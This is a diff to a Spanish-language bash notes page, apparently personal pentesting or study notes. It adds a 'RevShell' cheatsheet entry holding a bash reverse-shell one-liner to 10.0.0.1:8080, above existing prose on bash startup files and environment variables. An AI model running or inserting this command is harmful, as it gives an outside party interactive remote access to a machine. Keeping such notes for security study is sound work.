@@ -2,6 +2,15 @@
 title: bash
 ---
 
+# Cheatsheet
+
+## RevShell
+
+```bash
+bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+```
+
+# Scripting
 ## 1. Bash environment
 
 Al inicializar una bash, el sistema suele llamar a archivos como *~/.bashrc*, *~/.bash_login* ó *~/.bash_profile*. De igual forma, al cerrarse se llama a *~/.bash_logout*. Muy ligado a este entorno, están las **variables de entorno** (*environment variables*).
